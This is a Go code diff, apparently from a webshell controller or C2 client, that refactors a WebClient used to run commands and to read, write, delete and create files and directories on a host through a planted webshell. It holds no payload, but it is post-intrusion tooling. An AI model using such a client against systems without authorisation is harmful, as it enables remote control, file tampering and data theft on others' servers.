@@ -8,11 +8,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/sirupsen/logrus"
+	"path/filepath"
 	"time"
 )
 
 // 与WebShell通信
 type WebClient struct {
+	ID              int64
 	server          server.WebShellServer
 	session         *core.Session
 	requestHandler  *c2.RequestHandler
@@ -29,7 +31,9 @@ const (
 )
 
 func NewWebClient(target core.Target, config c2.C2Yaml) *WebClient {
+
 	client := &WebClient{
+		ID: core.GenerateID(),
 		session: &core.Session{
 			ID:             core.GenerateID(),
 			OperateHistory: nil,
@@ -73,7 +77,6 @@ func (client WebClient) request(data []byte) []byte {
 		return nil
 	}
 	client.http.SubmitRequest(req)
-	fmt.Println(string(req.Body))
 	response, err := client.responseHandler.Handler(client.session, req.Response)
 	if err != nil {
 		client.errorChan <- fmt.Errorf("%s hanlde response error: %v", core.GetSimpleFuncName(2), err)
@@ -119,6 +122,10 @@ func (client *WebClient) GetSession() *core.Session {
 	return client.session
 }
 
+func (client *WebClient) GetFileSystem() *core.FileSystemCache {
+	return client.session.FileSystem
+}
+
 // webshell 执行命令
 func (client *WebClient) RunCMD(path, cmd string) string {
 	if path == CurrentDir {
@@ -154,6 +161,7 @@ func (client *WebClient) LoadDir(path string) {
 	client.session.AddOperateHistory(core.GetCallerName(), []string{path})
 }
 
+// 读取文件
 func (client WebClient) ReadFile(file *core.FileInfo) string {
 	readFile := client.server.ReadFile(file)
 	response := client.request(readFile)
@@ -165,6 +173,7 @@ func (client WebClient) ReadFile(file *core.FileInfo) string {
 	return string(response)
 }
 
+// 写入文件
 func (client WebClient) WriteFile(file *core.FileInfo, content string) bool {
 	writeFile := client.server.WriteFile(file, content)
 	response := client.request(writeFile)
@@ -172,9 +181,10 @@ func (client WebClient) WriteFile(file *core.FileInfo, content string) bool {
 		return false
 	}
 	client.session.AddOperateHistory(core.GetCallerName(), []string{file.FilePath, content})
-	return string(response) == "ok"
+	return string(response) == Success
 }
 
+// 删除文件
 func (client WebClient) DeleteFile(file *core.FileInfo) bool {
 	deleteData := client.server.Delete(file.FilePath)
 	response := client.request(deleteData)
@@ -182,7 +192,7 @@ func (client WebClient) DeleteFile(file *core.FileInfo) bool {
 		return false
 	}
 	if string(response) == "ok" {
-		directory := client.session.FileSystem.GetDirectory(file.FilePath)
+		directory := client.session.FileSystem.GetDirectory(filepath.Dir(file.FilePath))
 		for i, f := range directory.Files {
 			if f.Name == file.Name {
 				directory.Files = append(directory.Files[:i], directory.Files[i+1:]...)
@@ -194,6 +204,22 @@ func (client WebClient) DeleteFile(file *core.FileInfo) bool {
 	return false
 }
 
+// 删除目录
+func (client WebClient) DeleteDir(dir *core.Directory) bool {
+	deleteData := client.server.Delete(dir.Path)
+	response := client.request(deleteData)
+	if response == nil {
+		return false
+	}
+	if string(response) == Success {
+		client.session.FileSystem.RemoveDir(dir)
+		client.session.AddOperateHistory(core.GetCallerName(), []string{dir.Path})
+		return true
+	}
+	return false
+}
+
+// 创建文件
 func (client WebClient) MakeFile(directory *core.Directory, fileName string) *core.FileInfo {
 	filePath := directory.Path + "/" + fileName
 	makeFile := client.server.MakeFile(filePath)
@@ -217,15 +243,9 @@ func (client WebClient) MakeFile(directory *core.Directory, fileName string) *co
 	return nil
 }
 
+// 创建目录
 func (client WebClient) MakeDir(directory *core.Directory, dirName string) *core.Directory {
 	dirPath := directory.Path + "/" + dirName
-	dir := &core.Directory{
-		Name:           dirName,
-		SubDirectories: make([]*core.Directory, 0),
-		Files:          make([]*core.FileInfo, 0),
-		Path:           dirPath,
-		Init:           false,
-	}
 	makeDir := client.server.MakeDir(dirPath)
 	response := client.request(makeDir)
 	if response == nil {
@@ -233,6 +253,13 @@ func (client WebClient) MakeDir(directory *core.Directory, dirName string) *core
 	}
 	if string(response) == "ok" {
 		//缓存子目录
+		dir := &core.Directory{
+			Name:           dirName,
+			SubDirectories: make([]*core.Directory, 0),
+			Files:          make([]*core.FileInfo, 0),
+			Path:           dirPath,
+			Init:           false,
+		}
 		directory.SubDirectories = append(directory.SubDirectories, dir)
 		client.session.FileSystem.CacheLoadedDir(dir)
 		client.session.AddOperateHistory(core.GetCallerName(), []string{dirPath})
